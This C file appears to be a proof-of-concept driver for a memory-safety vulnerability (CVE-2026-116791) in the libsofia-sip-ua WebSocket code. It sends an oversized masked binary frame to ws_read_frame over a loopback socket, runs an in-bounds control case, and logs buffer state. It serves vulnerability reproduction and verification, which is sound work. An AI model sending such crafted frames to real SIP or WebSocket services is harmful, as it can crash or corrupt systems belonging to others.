/*
 * Real-library driver for CVE-2026-116791 / GHSA-whfw-c3jj-99rp.
 *
 * Links against the full autogen/configure/make-built libsofia-sip-ua and
 * drives the public ws.h API (ws_set_global_payload_size_max, ws_init,
 * ws_read_frame) over an accepted 127.0.0.1:0 TCP socket.
 *
 *   ./real_ws_driver full     -> masked BINARY frame, 64-bit len 65536
 *   ./real_ws_driver short    -> same, 65520 payload bytes (in-bounds control)
 */
#define _GNU_SOURCE
#include <arpa/inet.h>
#include <errno.h>
#include <poll.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

#include "ws.h"

#ifndef PIN_LABEL
#define PIN_LABEL "unknown"
#endif
#ifndef WS_BLOCK
#define WS_BLOCK 10000
#endif

#define FULL_PAYLOAD  65536
#define SHORT_PAYLOAD 65520
#define CAP_BYTES     (4 * 1024 * 1024)

static const uint8_t mask4[4] = { 0x41, 0x5a, 0x42, 0x43 };

static void die(const char *s)
{
	perror(s);
	exit(2);
}

static void write_all(int fd, const uint8_t *buf, size_t len)
{
	size_t off = 0;
	while (off < len) {
		ssize_t w = write(fd, buf + off, len - off);
		if (w < 0) {
			if (errno == EINTR) continue;
			die("write(frame)");
		}
		off += (size_t)w;
	}
}

static int read_http_response(int fd)
{
	char buf[1024];
	size_t used = 0;
	for (;;) {
		struct pollfd pfd;
		ssize_t r;
		pfd.fd = fd;
		pfd.events = POLLIN;
		if (poll(&pfd, 1, 5000) != 1) return -1;
		r = recv(fd, buf + used, sizeof(buf) - used - 1, 0);
		if (r <= 0) return -1;
		used += (size_t)r;
		buf[used] = '\0';
		if (strstr(buf, "\r\n\r\n")) return 0;
		if (used + 1 >= sizeof(buf)) return -1;
	}
}

static int make_loopback_pair(int *cli_out)
{
	int lsn, cli, srv;
	struct sockaddr_in addr;
	socklen_t alen = sizeof(addr);

	lsn = socket(AF_INET, SOCK_STREAM, 0);
	if (lsn < 0) die("socket(listen)");
	memset(&addr, 0, sizeof(addr));
	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
	addr.sin_port = 0;                    /* ephemeral port */
	if (bind(lsn, (struct sockaddr *)&addr, sizeof(addr)) < 0) die("bind");
	if (listen(lsn, 1) < 0) die("listen");
	if (getsockname(lsn, (struct sockaddr *)&addr, &alen) < 0) die("getsockname");

	cli = socket(AF_INET, SOCK_STREAM, 0);
	if (cli < 0) die("socket(client)");
	if (connect(cli, (struct sockaddr *)&addr, sizeof(addr)) < 0) die("connect");
	srv = accept(lsn, (struct sockaddr *)&addr, &alen);
	if (srv < 0) die("accept");
	close(lsn);
	*cli_out = cli;
	return srv;
}

/* Real WebSocket opening handshake; ws_init() drives ws_handshake() itself. */
static void send_upgrade(int cli)
{
	static const char req[] =
		"GET /sip HTTP/1.1\r\n"
		"Host: 127.0.0.1\r\n"
		"Upgrade: websocket\r\n"
		"Connection: Upgrade\r\n"
		"Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n"
		"Sec-WebSocket-Version: 13\r\n\r\n";
	write_all(cli, (const uint8_t *)req, sizeof(req) - 1);
}

static void build_frame(uint8_t *frame, size_t payload_len)
{
	uint64_t be;
	size_t i;

	frame[0] = 0x82;                 /* FIN | WSOC_BINARY */
	frame[1] = 0xFF;                 /* MASK | 127 (64-bit length) */
	be = htobe64((uint64_t)payload_len);
	memcpy(frame + 2, &be, 8);
	memcpy(frame + 10, mask4, 4);
	for (i = 0; i < payload_len; i++) {
		uint8_t plain = (uint8_t)(0x11u + (i % 7u));
		frame[14 + i] = (uint8_t)(plain ^ mask4[i % 4]);
	}
}

int main(int argc, char **argv)
{
	const char *mode = argc > 1 ? argv[1] : "full";
	int is_short = (strcmp(mode, "short") == 0);
	size_t payload_len = is_short ? SHORT_PAYLOAD : FULL_PAYLOAD;
	uint8_t *frame = NULL;
	wsh_t wsh;
	ws_opcode_t oc = WSOC_CONTINUATION;
	uint8_t *data = NULL;
	ssize_t rv;
	ssize_t in_rv;
	int cli_fd, srv_fd;

	frame = (uint8_t *)malloc(14 + payload_len);
	if (!frame) return 2;
	build_frame(frame, payload_len);

	srv_fd = make_loopback_pair(&cli_fd);
	send_upgrade(cli_fd);

	ws_set_global_payload_size_max(CAP_BYTES);
	in_rv = ws_init(&wsh, srv_fd, NULL, 0, WS_BLOCK, 1);
	fprintf(stderr,
		"PRECALL PIN=%s MODE=%s PAYLOAD=%zu CAP=%d INIT_RC=%zd HANDSHAKE=%d "
		"DATALEN=%zd BUFFER=%p BBUFFER=%p BBUFLEN=%zu\n",
		PIN_LABEL, mode, payload_len, CAP_BYTES, in_rv, wsh.handshake,
		wsh.datalen, (void *)wsh.buffer, (void *)wsh.bbuffer, wsh.bbuflen);
	if (read_http_response(cli_fd) != 0) {
		fprintf(stderr, "HTTP_RESPONSE_FAIL\n");
		return 2;
	}

	/* Contract: force the established state before feeding the frame. */
	wsh.handshake = 1;
	write_all(cli_fd, frame, 14 + payload_len);

	rv = ws_read_frame(&wsh, &oc, &data);
	fprintf(stderr,
		"POSTCALL PIN=%s MODE=%s RV=%zd DATALEN=%zd RPLEN=%zd BBLEN=%zu "
		"OC=%d DATA=%p\n",
		PIN_LABEL, mode, rv, wsh.datalen, wsh.rplen, wsh.bbuflen,
		(int)oc, (void *)data);

	close(cli_fd);
	close(srv_fd);
	free(frame);
	return 0;
}
